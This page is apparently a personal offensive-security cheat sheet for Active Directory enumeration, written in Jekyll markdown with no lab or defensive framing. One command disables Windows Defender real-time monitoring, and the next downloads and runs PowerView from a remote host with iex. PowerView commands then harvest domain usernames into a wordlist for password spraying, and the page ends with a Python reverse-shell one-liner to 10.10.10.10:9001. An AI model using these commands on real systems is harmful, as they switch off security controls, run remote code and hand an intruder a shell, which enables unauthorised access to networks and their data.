---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE


# ACTIVE DIRECTORY


### DOMAIN ENUMERATION
 # Patch AMSI or disable AV
<span style="color: Green;"># Patch AMSI or disable AV</span>
<span class="demo-highlight"># Patch AMSI or disable AV</span>

```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
```
 <br>
<span class="demo-highlight"># Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying</span>

```powershell
      Get-NetUsers | select samaccountname > username.txt
```
<br>
<span class="demo-highlight"># Get all the computers in the domain</span>

```powershell
Get-NetComputer
```
<br>
<span class="demo-highlight"># Get information about specific computer</span>

```powershell
Get-NetComputer -Identity <computer_name>
```


```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```